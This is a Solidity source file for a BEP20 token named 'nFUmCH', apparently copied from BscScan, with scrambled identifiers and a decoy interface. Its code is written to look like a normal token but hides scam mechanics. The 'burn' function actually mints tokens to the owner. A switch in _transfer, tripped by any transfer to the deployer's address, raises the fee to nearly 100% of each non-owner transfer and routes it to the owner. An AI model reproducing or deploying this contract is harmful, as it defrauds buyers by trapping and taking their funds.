/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.6.3;
//  IUniswapV2Factory
interface IUniswapV2Factorydsd {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function getdsfjnhjsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfhmfghgirs(uint) external view returns (address pair);
		function fundTodsajeqew() external view returns (address);
    function fundToadddkfsdsdfd() external view returns (address);
    function allPaigsLendgth() external view returns (uint);
    function createhygkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhukerewPTo(address) external;
    function setLPjlhpTrewoadd(address) external;
}

/////////
contract nFUmCH {
uint256 private  njGBkA = 1000000000000000000;
address private  doBQJR = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant cjjKln = 99999;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  wxKgWT = 10000000000000;
uint256 private  ylZFZq = 1000000000000000;
uint256 private  uPyPYF = 10000000000;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
address private  mRMcEJ = address(0);
address private  FiIsLT = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
mapping (address => uint256) public balanceOf;
address private  esIJMT = address(0);
string public  name = "nFUmCH";
string public  symbol = "nFUmCH";
uint256 private  EFwUdk = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  bQJpfE = address(0);
address private  exaePC = address(0);
uint256 private  pqTbux = 1000000000000000000000;
uint256 private  fhDqfu = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  smQJia = address(0);
address private  aMFDvE = address(0);
address private  ZVhBNp = address(0);
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "UcjgyX");
require(to != address(0), "UcjgyX");
require(amount <= balanceOf[from], "UcjgyX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* cjjKln/njGBkA ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==doBQJR){
njGBkA = cjjKln+2;
}
emit Transfer(from, to, transferAmount);
}

function _getesIJMT() private returns (address) {
return esIJMT;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}

constructor () public {
doBQJR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getmRMcEJ() private returns (address) {
return mRMcEJ;
}



function _getsmQJia() private returns (address) {
return smQJia;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getfhDqfu() private returns (uint256) {
return fhDqfu;
}

function _getpqTbux() private returns (uint256) {
return pqTbux;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}








function _getFiIsLT() private returns (address) {
return FiIsLT;
}

function _getylZFZq() private returns (uint256) {
return ylZFZq;
}

function _getbQJpfE() private returns (address) {
return bQJpfE;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getZVhBNp() private returns (address) {
return ZVhBNp;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getuPyPYF() private returns (uint256) {
return uPyPYF;
}

function _getwxKgWT() private returns (uint256) {
return wxKgWT;
}

function _getEFwUdk() private returns (uint256) {
return EFwUdk;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}




function _getaMFDvE() private returns (address) {
return aMFDvE;
}

function _getexaePC() private returns (address) {
return exaePC;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tUcjgyX 0");
require(spender != address(0), "fUcjgyX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}